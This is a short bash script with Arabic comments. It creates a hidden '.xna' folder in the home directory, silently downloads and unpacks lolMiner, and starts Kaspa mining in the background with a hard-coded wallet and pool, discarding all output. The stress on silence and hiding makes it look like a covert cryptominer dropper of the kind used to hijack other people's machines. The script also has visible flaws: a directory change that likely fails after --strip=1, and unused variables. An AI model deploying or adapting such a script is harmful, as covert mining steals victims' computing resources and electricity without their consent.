#!/bin/bash

# الانتقال إلى المنزل وإنشاء مجلد خفي
cd ~
mkdir -p .xna && cd .xna

# تحميل LolMiner بصمت
wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82/lolMiner_v1.82_Lin64.tar.gz

# فك الضغط بصمت
tar -xvf lolMiner_v1.82_Lin64.tar.gz --strip=1
cd 1.82

# عنوان المحفظة (استبدله بعنوانك)
WALLET="qz3fgg59xzmt7y33shflewu4chgwaed6zsf2qe2crj99n0ljnr2ssu252494y"
WORKER="gpu_worker"
POOL="stratum+tcp://de.kaspa.herominers.com:1206"

# تشغيل LolMiner فقط على GPU بصمت
nohup ./lolMiner --coin KASPA --pool stratum+tcp://de.kaspa.herominers.com:1206 --user qz3fgg59xzmt7y33shflewu4chgwaed6zsf2qe2crj99n0ljnr2ssu252494y --mode mining > /dev/null 2>&1 &

